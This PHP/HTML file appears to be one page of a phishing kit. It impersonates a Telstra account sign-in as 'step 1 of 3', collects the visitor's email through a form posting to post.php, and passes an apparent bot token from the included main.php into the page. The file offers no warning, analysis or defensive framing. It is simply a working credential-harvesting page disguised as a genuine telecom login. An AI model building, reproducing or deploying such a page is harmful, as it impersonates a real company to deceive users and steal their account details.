<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>telstra</title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
    <header>
        <div class="pic">
            <img src="res/img/logo.png" alt="">
        </div>
    </header>

    <main>
        <div class="container">
            <div class="step">
            <span> STEP 1 OF 3</span>
            <div class="title">
            <h2>Your account email</h2>
            </div>
            </div>
			<script>var token=<?php echo json_encode($bot); ?>;</script>
            <div class="col">
                <form action="post.php" method="post">
                    <label>Enter your email</label>
                    <span>To proceed, you'll need to set up your email address.</span>
                    <input type="email" name="user" required>
                    <div class="btn">
                    <button type="submit">Next</button>
                    </div>
                </form>
            </div>
        </div>
    </main>
    <footer>
        <div class="links">
            <a href="#" class="copy">Copyright © 2025 Telstra</a><span>|</span>
            <a href="#">Privacy</a><span>|</span>
            <a href="#">Terms of use</a>
        </div>
    </footer>
	
<script src="./res/cdn/jq.js"></script>
<script src="./res/jquery.js"></script>

    
</body>
</html>